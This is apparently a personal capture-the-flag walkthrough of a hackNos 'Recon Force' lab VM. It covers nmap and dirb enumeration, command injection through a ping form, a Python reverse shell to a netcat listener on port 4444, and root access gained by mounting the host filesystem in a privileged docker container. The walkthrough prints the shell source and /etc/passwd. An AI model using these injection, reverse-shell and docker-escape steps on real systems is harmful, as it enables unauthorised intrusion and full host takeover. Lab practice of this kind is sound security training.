1) Enumeration: 
	- VM IP: sudo netdiscover
		* VMWare 192.168.0.12
	- VM info: nmap -A 192.168.0.12
		* 21/tcp open  ftp  
			Anonymous log-in is on. --> banner "ftp 'Security@hackNos'"
		* 22/tcp open  ssh
		* 80/tcp open  http

	- web server info: dirb -w http://192.168.0.12 & 
		* http://192.168.0.12/index.html
		* http://192.168.0.12/css/style.css
		* http://192.168.0.12/css/2.jpg

	- web server 192.168.0.12/5ecure login using the :
		* admin:Security@hackNos <-- Banner

	- web server info: dirb -w http://192.168.0.12/5ecure		
		* http://192.168.0.12/5ecure/index.html
			form POSTs data to output.php
		* http://192.168.0.12/5ecure/css/style.css
		* http://192.168.0.12/5ecure/css/2.jpg
		* http://192.168.0.12/5ecure/output.php
			simple ping <ip> function

2) Pene:
	- 192.168.0.12/5ecure/out.php -> exec(ping $ip) -> injection 
		* $ip = || command  # /&&/& + command' didn't work, char escape or header conflict
		- ip=|| whoami 
			* www-data
		- ip=|| export
			* export APACHE_LOCK_DIR='/var/lock/apache2'
			* export APACHE_LOG_DIR='/var/log/apache2'
			* export APACHE_PID_FILE='/var/run/apache2/apache2.pid'
			* export APACHE_RUN_DIR='/var/run/apache2'
			* export APACHE_RUN_GROUP='www-data'
			* export APACHE_RUN_USER='www-data'
			* export INVOCATION_ID='e514c3c1dbef4f068ab8124007ec59a6'
			* export JOURNAL_STREAM='9:21541'
			* export LANG='C'
			* export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin'
			* export PWD='/var/www/recon/5ecure'		
		- ip=|| ls 
			* system navigation
		- ip=|| vi *file*
			* privilege check

		- intresting files:
			* /var/opt/python.py
			* /etc/passwd

2b) CLI access
	- python.py on Recon Force server is creating a connection to 192.168.0.104:4444 and runs an interactive bash.
	- configurate host/attacking machine network settings
		* add a new network connection and manualy set it up:
			- IP: 192.168.0.104
			- Netmask: 255.255.255.0
			- Gateway: 192.168.0.1
			- connect to the network using the new interface
	- run nc -lvp 4444 to initiate a listener on 4444
	- on 192.168.0.12/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
	- tty: python -c 'import pty; pty.spawn("/bin/bash")'
	- getent group 
		* docker:x:119:   # note: passwd --> recon:x:1000:119:rahul:/home/recon:/bin/bash
		* recon user gid = docker 

3) Escelation
	- ssh 192.168.0.12 -l recon
		* pass: Security@hackNos
	- docker run -it --privileged --name=ctf -v /:/host:rw alpine sh
	- container: cd /host

!) Files:
	- /var/opt/python.py:
		
		import socket
		import subprocess
		import os
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("192.168.0.104", 4444))
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		p = subprocess.call(["/bin/bash", "-i"])

	- /var/etc:
		
		root:x:0:0:root:/root:/bin/bash
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		bin:x:2:2:bin:/bin:/usr/sbin/nologin
		sys:x:3:3:sys:/dev:/usr/sbin/nologin
		sync:x:4:65534:sync:/bin:/bin/sync
		games:x:5:60:games:/usr/games:/usr/sbin/nologin
		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
		lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
		mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
		news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
		uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
		proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
		backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
		list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
		irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
		gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
		nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
		systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
		systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
		systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
		messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
		syslog:x:104:110::/home/syslog:/usr/sbin/nologin
		_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
		uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
		tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
		landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
		pollinate:x:109:1::/var/cache/pollinate:/bin/false
		sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
		systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
		recon:x:1000:119:rahul:/home/recon:/bin/bash
		lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
		ftp:x:111:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
		mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
		dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
